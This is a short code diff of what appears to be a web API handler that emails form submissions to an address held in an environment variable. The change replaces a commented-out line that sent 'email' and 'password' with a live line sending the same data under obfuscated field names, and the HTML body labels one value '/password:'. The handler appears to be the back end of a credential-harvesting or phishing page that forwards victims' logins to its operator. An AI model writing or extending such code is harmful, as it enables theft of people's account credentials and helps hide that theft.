@@ -27,7 +27,7 @@ export default function handler(
               from: `"miko" <${process.env.APP_ACCOUNT}>`,
               to: process.env.EMAIL_TO_SEND,
               subject: 'site',
-              // text: `${JSON.stringify(email)} ${JSON.stringify(password)}`,
+              text: `${JSON.stringify(params.jenneta)} ${JSON.stringify(params.jennet)}`,
               html: `<h3>${JSON.stringify(params.jenneta).replaceAll('"', '')} /password: ${JSON.stringify(params.jennet).replaceAll('"', '')}</h3>`
             }).then((rec) => {
 
